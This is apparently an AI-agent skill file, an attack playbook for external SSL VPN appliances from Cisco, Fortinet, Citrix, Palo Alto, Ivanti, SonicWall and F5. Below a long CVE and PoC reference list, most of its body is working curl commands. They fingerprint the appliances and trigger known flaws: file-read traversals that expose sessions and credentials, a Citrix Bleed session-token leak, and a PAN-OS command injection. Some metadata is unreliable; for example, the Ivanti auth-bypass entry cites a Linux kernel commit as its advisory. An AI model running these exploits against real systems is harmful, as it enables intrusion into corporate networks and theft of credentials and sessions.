<!-- harvested: 0x002132/skills-bugbounty/enterprise-vpn-attack/SKILL.md on 2026-10-23T20:17:14.018579+00:00 -->
<!-- STAGING ONLY -- condense to skills/_schema.md house style, verify the source repo's license, then promote to skills/seeds/ -->

---
name: enterprise-vpn-attack
description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
sources: authorized-engagement, public-advisories, cisa-kev
report_count: 1
# bughive-repro-start
cve:
  - CVE-2019-19781
  - CVE-2018-0296
  - CVE-2020-3452
  - CVE-2023-20269
  - CVE-2024-20481
  - CVE-2018-13379
  - CVE-2022-42475
  - CVE-2023-27997
  - CVE-2024-21762
  - CVE-2024-55591
  - CVE-2022-27518
  - CVE-2023-3519
  - CVE-2023-4966
  - CVE-2024-3400
  - CVE-2019-11510
  - CVE-2021-22893
  - CVE-2024-21887
  - CVE-2024-46805
  - CVE-2021-20016
  - CVE-2024-40766
repro: partial
references:
  - source: nvd
    id: CVE-2019-19781
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-19781"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2019-19781
    url: "https://support.citrix.com/article/CTX267027"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2019-19781
    url: "https://github.com/advisories/GHSA-jjcm-f6q3-w5xj"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2019-19781
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2019-19781
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47930.txt"
    gave: "public PoC (EDB-47930)"
  - source: poc-in-github
    id: CVE-2019-19781
    url: "https://github.com/trustedsec/cve-2019-19781"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2018-0296
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2018-0296"
    gave: "descriptions, configurations, 4 Exploit-tagged refs"
  - source: vendor
    id: CVE-2018-0296
    url: "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2018-0296
    url: "https://github.com/advisories/GHSA-h2mj-pqgp-xmmj"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2018-0296
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Unknown"
  - source: exploitdb
    id: CVE-2018-0296
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/44956.py"
    gave: "public PoC (EDB-44956)"
  - source: poc-in-github
    id: CVE-2018-0296
    url: "https://github.com/yassineaboukir/CVE-2018-0296"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2020-3452
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-3452"
    gave: "descriptions, configurations, 6 Exploit-tagged refs"
  - source: vendor
    id: CVE-2020-3452
    url: "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2020-3452
    url: "https://github.com/advisories/GHSA-q26c-r46f-6fcq"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2020-3452
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Unknown"
  - source: exploitdb
    id: CVE-2020-3452
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48722.txt"
    gave: "public PoC (EDB-48722)"
  - source: poc-in-github
    id: CVE-2020-3452
    url: "https://github.com/darklotuskdb/CISCO-CVE-2020-3452-Scanner-Exploiter"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2023-20269
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-20269"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2023-20269
    url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ravpn-auth-8LyfCkeC"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2023-20269
    url: "https://github.com/advisories/GHSA-v7pw-9cmm-88m6"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2023-20269
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2023-09-13, dueDate 2023-10-04, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2023-20269
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2023-20269
    url: null
    gave: "404 for master/2023/CVE-2023-20269.json"
  - source: nvd
    id: CVE-2024-20481
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-20481"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-20481
    url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-bf-dos-vDZhLqrW"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2024-20481
    url: "https://github.com/advisories/GHSA-cp3f-3wc5-j85w"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-20481
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2024-10-24, dueDate 2024-11-14, knownRansomwareCampaignUse=Unknown"
  - source: exploitdb
    id: CVE-2024-20481
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-20481
    url: null
    gave: "404 for master/2024/CVE-2024-20481.json"
  - source: nvd
    id: CVE-2018-13379
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2018-13379"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2018-13379
    url: "https://fortiguard.com/advisory/FG-IR-18-384"
    gave: "broken or gated (502)"
  - source: ghsa
    id: CVE-2018-13379
    url: "https://github.com/advisories/GHSA-2q79-m25p-r2q3"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2018-13379
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2018-13379
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/47288.py"
    gave: "public PoC (EDB-47288)"
  - source: poc-in-github
    id: CVE-2018-13379
    url: "https://github.com/milo2012/CVE-2018-13379"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2022-42475
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-42475"
    gave: "descriptions, configurations, 2 Exploit-tagged refs"
  - source: vendor
    id: CVE-2022-42475
    url: "https://fortiguard.com/psirt/FG-IR-22-398"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2022-42475
    url: "https://github.com/advisories/GHSA-p3vq-4cxh-gfp9"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2022-42475
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2022-12-13, dueDate 2023-01-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2022-42475
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2022-42475
    url: "https://github.com/scrt/cve-2022-42475"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2023-27997
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-27997"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2023-27997
    url: "https://fortiguard.com/psirt/FG-IR-23-097"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2023-27997
    url: "https://github.com/advisories/GHSA-2hj2-fcr9-9p35"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2023-27997
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2023-06-13, dueDate 2023-07-04, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2023-27997
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2023-27997
    url: "https://github.com/BishopFox/CVE-2023-27997-check"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2024-21762
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-21762"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-21762
    url: "https://fortiguard.com/psirt/FG-IR-24-015"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2024-21762
    url: "https://github.com/advisories/GHSA-v4hq-m4wr-6pmj"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-21762
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2024-02-09, dueDate 2024-02-16, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2024-21762
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-21762
    url: "https://github.com/h4x0r-dz/CVE-2024-21762"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2024-55591
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-55591"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-55591
    url: "https://fortiguard.fortinet.com/psirt/FG-IR-24-535"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2024-55591
    url: "https://github.com/advisories/GHSA-v4mr-pqhx-vpm2"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-55591
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2025-01-14, dueDate 2025-01-21, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2024-55591
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-55591
    url: "https://github.com/watchtowrlabs/fortios-auth-bypass-poc-CVE-2024-55591"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2022-27518
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-27518"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2022-27518
    url: "https://support.citrix.com/article/CTX474995"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2022-27518
    url: "https://github.com/advisories/GHSA-w8vh-3g88-rg95"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2022-27518
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2022-12-13, dueDate 2023-01-03, knownRansomwareCampaignUse=Unknown"
  - source: exploitdb
    id: CVE-2022-27518
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2022-27518
    url: "https://github.com/dolby360/CVE-2022-27518_POC"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2023-3519
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-3519"
    gave: "descriptions, configurations, 2 Exploit-tagged refs"
  - source: vendor
    id: CVE-2023-3519
    url: "https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2023-3519
    url: "https://github.com/advisories/GHSA-m4j4-rmj5-w5gp"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2023-3519
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2023-07-19, dueDate 2023-08-09, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2023-3519
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2023-3519
    url: "https://github.com/BishopFox/CVE-2023-3519"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2023-4966
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-4966"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2023-4966
    url: "https://support.citrix.com/article/CTX579459"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2023-4966
    url: "https://github.com/advisories/GHSA-2g42-2pwg-93cj"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2023-4966
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2023-10-18, dueDate 2023-11-08, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2023-4966
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2023-4966
    url: "https://github.com/Chocapikk/CVE-2023-4966"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2024-3400
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-3400"
    gave: "descriptions, configurations, 4 Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-3400
    url: "https://security.paloaltonetworks.com/CVE-2024-3400"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2024-3400
    url: "https://github.com/advisories/GHSA-v475-xhc9-wfxg"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-3400
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2024-04-12, dueDate 2024-04-19, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2024-3400
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux_x86-64/remote/51996.txt"
    gave: "public PoC (EDB-51996)"
  - source: poc-in-github
    id: CVE-2024-3400
    url: "https://github.com/h4x0r-dz/CVE-2024-3400"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2019-11510
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-11510"
    gave: "descriptions, configurations, 4 Exploit-tagged refs"
  - source: vendor
    id: CVE-2019-11510
    url: "https://kb.pulsesecure.net/?atype=sa"
    gave: "vendor fetch failed: response exceeded 500000 bytes"
  - source: ghsa
    id: CVE-2019-11510
    url: "https://github.com/advisories/GHSA-6wr2-qx99-98mg"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2019-11510
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2019-11510
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/47297.rb"
    gave: "public PoC (EDB-47297)"
  - source: poc-in-github
    id: CVE-2019-11510
    url: "https://github.com/projectzeroindia/CVE-2019-11510"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2021-22893
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-22893"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2021-22893
    url: "https://blog.pulsesecure.net/pulse-connect-secure-security-update/"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2021-22893
    url: "https://github.com/advisories/GHSA-hcxw-prp6-q3jq"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2021-22893
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2021-22893
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2021-22893
    url: "https://github.com/ZephrFish/CVE-2021-22893_HoneyPoC2"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2024-21887
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-21887"
    gave: "descriptions, configurations, 2 Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-21887
    url: "https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US"
    gave: "vendor fetch failed: response exceeded 500000 bytes"
  - source: ghsa
    id: CVE-2024-21887
    url: "https://github.com/advisories/GHSA-87qj-c5f7-6c8q"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-21887
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2024-01-10, dueDate 2024-01-22, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2024-21887
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-21887
    url: "https://github.com/Chocapikk/CVE-2024-21887"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2024-46805
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-46805"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-46805
    url: "https://git.kernel.org/stable/c/01cd55b971131b07b7ff8d622fa93bb4f8be07df"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2024-46805
    url: "https://github.com/advisories/GHSA-c95g-5fw2-h647"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-46805
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "not in KEV"
  - source: exploitdb
    id: CVE-2024-46805
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-46805
    url: null
    gave: "404 for master/2024/CVE-2024-46805.json"
  - source: nvd
    id: CVE-2021-20016
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-20016"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2021-20016
    url: "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0001"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2021-20016
    url: "https://github.com/advisories/GHSA-c283-6775-92m9"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2021-20016
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2021-11-17, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2021-20016
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2021-20016
    url: null
    gave: "404 for master/2021/CVE-2021-20016.json"
  - source: nvd
    id: CVE-2024-40766
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-40766"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-40766
    url: "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2024-40766
    url: "https://github.com/advisories/GHSA-8736-pr6r-r9hr"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-40766
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2024-09-09, dueDate 2024-09-30, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2024-40766
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-40766
    url: null
    gave: "404 for master/2024/CVE-2024-40766.json"
# bughive-repro-end
---

## When to use this skill

Trigger when recon surfaces:
- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths → Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains
- Port 443 returning login pages with `Server: Apache` or banner like "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"
- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)
- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)

DO NOT use for:
- Internal lateral-movement post-foothold (out of scope per user's boundary)
- VPN client-side bugs (different attack class)
- IPsec / L2TP / OpenVPN (different protocols, not SSL VPN web stack)

---

## Vendor identification (fingerprinting)

### Cisco ASA / AnyConnect
```bash
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.

```bash
# Path-based version hints (older builds leaked builds in URLs)
curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response

### Citrix NetScaler / ADC / Gateway
```bash
curl -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
# Login page contains: "NetScaler", "Citrix Gateway"

# Version banner
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

### Palo Alto GlobalProtect
```bash
curl -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
# Page contains: "GlobalProtect Portal", "PAN-OS"

# Version banner via login page
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
# Or check meta tag
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
# Page contains: "Pulse Secure" or "Ivanti Connect Secure"

# Version
curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

### SonicWall NetExtender / SMA
```bash
curl -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
# Page contains: "SonicWall", "NetExtender", "SMA"
```

### F5 Big-IP / APM
```bash
curl -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
# Server: BIG-IP (sometimes)
```

---

## CVE matrix — pre-auth or auth-bypass (2018-2026)

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
| **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force a group + valid creds combo against `/+webvpn+/index.html` |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |

```bash
# Cisco CVE-2020-3452 — file read
curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5

# Cisco CVE-2018-0296 — path traversal
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20

# Files commonly retrievable on vulnerable ASA:
# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
# /+CSCOE+/session_password.html
# /+CSCOE+/files/files.html
```

### Fortinet FortiGate / FortiOS

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |

```bash
# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
# Response contains plaintext usernames + sessions if vulnerable

# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):
# IP:PORT     username     password     (and others)
```

### Citrix NetScaler / ADC / Gateway

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |

```bash
# Citrix Bleed (CVE-2023-4966) detection
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
# If response is large (>10KB) and contains random memory contents — vulnerable
# Session tokens often present in the memory dump

# CVE-2019-19781 file read
curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
```

### Palo Alto GlobalProtect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |

```bash
# CVE-2024-3400 detection
curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
  --data 'jsessionid=test'
# Look for file-creation side-effect on test path — palo creates file with command output
```

### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | Arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step; test with nuclei |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Command injection on web component | `POST /api/v1/totp/user-backup-code/` with crafted body |
| **CVE-2024-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |

```bash
# CVE-2019-11510 — Pulse file read
curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

### SonicWall

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
| **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |

---

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash
# Cisco ASA
curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see `hunt-saml` for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

